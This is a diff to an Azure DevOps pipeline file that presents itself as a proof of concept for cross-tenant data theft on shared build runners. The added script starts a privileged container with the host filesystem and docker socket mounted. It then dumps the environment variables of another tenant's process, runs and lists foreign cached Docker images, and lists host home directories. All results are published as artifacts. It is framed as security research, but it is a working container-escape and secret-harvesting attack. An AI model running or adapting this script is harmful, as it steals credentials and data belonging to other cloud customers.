@@ -7,17 +7,17 @@ pr:
 name: $(Date:yyyyMMdd)$(Rev:.r)
 
 stages:
-- stage: FinalPoc
-  displayName: 'Final PoC: Cross-Tenant Docker Cache Exfiltration'
+- stage: ConclusiveEvidencePoc
+  displayName: 'Final PoC: Cross-Tenant Data Exfiltration'
   jobs:
-  - job: Pillage_Docker_Cache
-    displayName: 'PoC: Steal Cached Images from Other Tenants'
+  - job: Pillage_Runner_Host
+    displayName: 'PoC: Exfiltrate Data from Other Tenant Processes and Caches'
     pool:
       vmImage: 'ubuntu-22.04'
     steps:
     - checkout: none
     - task: Bash@3
-      displayName: 'Escape Container and Exfiltrate Foreign Docker Image Contents'
+      displayName: 'Escape Container and Pillage Host for Tenant Data'
       inputs:
         targetType: inline
         script: |
@@ -29,26 +29,35 @@ stages:
             echo "❌ CRITICAL FAILURE: User is not in the docker group. Aborting."
             exit 1
           fi
-          echo "✅ Confirmed user is in 'docker' group."
+          echo "✅ Confirmed: Container escape vector is present."
 
-          echo "--- ESCAPING CONTAINER to analyze the host's Docker cache ---"
+          echo "--- ESCAPING CONTAINER to hunt for cross-tenant data ---"
           
           docker run --rm --privileged --network=host --pid=host -v /:/hostfs \
             -v /var/run/docker.sock:/var/run/docker.sock \
             -v $(pwd)/artifacts:/artifacts \
             alpine:latest sh -c "
-              # We need the docker client inside our helper container
               apk add --no-cache docker-cli
 
-              echo '--- [HOST] Listing all Docker images cached on the host machine ---'
-              docker images --format '{{.Repository}}:{{.Tag}}' > /artifacts/host-docker-images.txt
+              # --- VECTOR 1: PROCESS SNOOPING ---
+              echo '--- [HOST] Searching for victim processes from other tenants... ---'
+              chroot /hostfs /bin/ps -eo pid,user,cmd > /artifacts/full-process-list.txt
+              VICTIM_PID=\$(cat /artifacts/full-process-list.txt | grep -E 'npm|mvn|dotnet|python|sh -c|mono' | grep -v 'vsts' | grep -v 'root' | grep -v 'containerd-shim' | awk '{print \$1}' | head -n 1)
 
-              # This is a list of known, pre-warmed images on the runner.
-              # We will filter these out to find images left by other jobs.
+              if [ -n \"\$VICTIM_PID\" ]; then
+                echo \"✅ SMOKING GUN 1: Found potential victim process \$VICTIM_PID. Dumping environment...\"
+                chroot /hostfs /bin/cat /proc/\$VICTIM_PID/environ | tr '\\0' '\\n' > /artifacts/victim-environment-variables.txt
+              else
+                echo 'ℹ️ No active victim process found.' > /artifacts/victim-environment-variables.txt
+              fi
+
+              # --- VECTOR 2: DOCKER CACHE PILLAGING ---
+              echo '--- [HOST] Searching for foreign Docker images cached by other tenants... ---'
+              docker images --format '{{.Repository}}:{{.Tag}}' > /artifacts/host-docker-images.txt
               cat << EOF > /tmp/default_images.txt
               node:20
               node:20-alpine
-              moby/buildkit:latest
+              moby/buildkit
               node:22
               node:22-alpine
               ubuntu:22.04
@@ -61,41 +70,29 @@ stages:
               alpine:3.17
               debian:10
               alpine:3.16
-              alpine:latest
+              alpine
               EOF
+              grep -ivf /tmp/default_images.txt /artifacts/host-docker-images.txt > /artifacts/foreign-images.txt || true
 
-              echo '--- [HOST] Searching for foreign images left by other tenants... ---'
-              # Use grep to find images that are NOT in our default list.
-              grep -vf /tmp/default_images.txt /artifacts/host-docker-images.txt > /artifacts/foreign-images.txt || true
-
-              if [ ! -s "/artifacts/foreign-images.txt" ]; then
-                echo '⚠️ No foreign images found in this run. The host may have been clean.'
-                echo 'Check host-docker-images.txt for the full list.'
-                exit 0
+              if [ -s \"/artifacts/foreign-images.txt\" ]; then
+                VICTIM_IMAGE=\$(head -n 1 /artifacts/foreign-images.txt)
+                echo \"✅ SMOKING GUN 2: Found foreign image '\$VICTIM_IMAGE'. Dumping its filesystem...\"
+                docker run --rm --entrypoint='' \"\$VICTIM_IMAGE\" sh -c 'ls -R /' > /artifacts/victim-image-filesystem.txt 2>&1 || \
+                  echo 'Failed to run victim image; it may not have a shell.' > /artifacts/victim-image-filesystem.txt
+              else
+                echo 'ℹ️ No foreign Docker images found.' > /artifacts/victim-image-filesystem.txt
               fi
-
-              VICTIM_IMAGE=\$(head -n 1 /artifacts/foreign-images.txt)
-              echo \"✅✅✅ SUCCESS: Found a foreign image: \$VICTIM_IMAGE\"
               
-              echo '--- [HOST] Attempting to run the victim image and dump its filesystem ---'
-              # This is the final proof: we run their image and list all its files.
-              docker run --rm --entrypoint='' \"\$VICTIM_IMAGE\" sh -c 'ls -R /' > /artifacts/victim-image-filesystem.txt 2>&1 || \
-                echo 'Failed to run victim image; it may not have a shell.' > /artifacts/victim-image-filesystem.txt
+              # --- VECTOR 3: HOME DIRECTORY PILLAGING ---
+              echo '--- [HOST] Searching for leftover files in home directories ---'
+              chroot /hostfs /bin/ls -laR /home > /artifacts/home-directory-listing.txt
             "
           
-          echo "--- SCRIPT COMPLETE ---"
-          if [ -s "artifacts/foreign-images.txt" ]; then
-            VICTIM_IMAGE=$(head -n 1 artifacts/foreign-images.txt)
-            echo "✅✅✅ SMOKING GUN FOUND: Discovered foreign image '\$VICTIM_IMAGE' and dumped its contents."
-            echo "--- First 50 lines of exfiltrated filesystem from '\$VICTIM_IMAGE' ---"
-            cat artifacts/victim-image-filesystem.txt | head -n 50
-          else
-            echo "⚠️ No conclusive evidence found on this run. The host may have been clean."
-          fi
+          echo "--- SCRIPT COMPLETE. See published artifacts for conclusive evidence. ---"
 
     - task: PublishPipelineArtifact@1
-      displayName: 'Publish Docker Exfiltration Artifacts'
+      displayName: 'Publish Exfiltration Artifacts'
       condition: succeededOrFailed()
       inputs:
         targetPath: 'artifacts'
-        artifact: 'azure-final-proof-docker-cache'
+        artifact: 'azure-conclusive-evidence'
